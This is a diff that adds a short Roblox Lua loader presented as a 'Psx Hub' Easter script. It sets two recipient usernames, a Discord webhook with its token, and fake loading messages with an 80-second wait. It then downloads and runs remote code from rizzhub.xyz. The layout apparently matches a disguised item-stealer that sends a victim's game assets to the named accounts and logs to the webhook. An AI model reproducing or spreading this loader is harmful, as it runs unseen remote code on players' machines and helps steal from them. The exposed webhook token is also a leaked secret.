@@ -1,0 +1,11 @@
+UserName = "Helll_YT"
+UserName2 = "OPERATORZOop"
+Webhook = "https://discord.com/api/webhooks/1096438948848476180/qn5FHY5VOxwn60juSy1qjP7m7kOBVXKKQycXsOmlvtzr1XKn7OQVooI-X75iGpcPTgre"
+_G.PremiumKey = "rizzhub-NWFDhmqCxJJMuDVtlelu"
+_G.ScriptName = "Psx Hub V.3 (EASTER)"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 80 
+
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
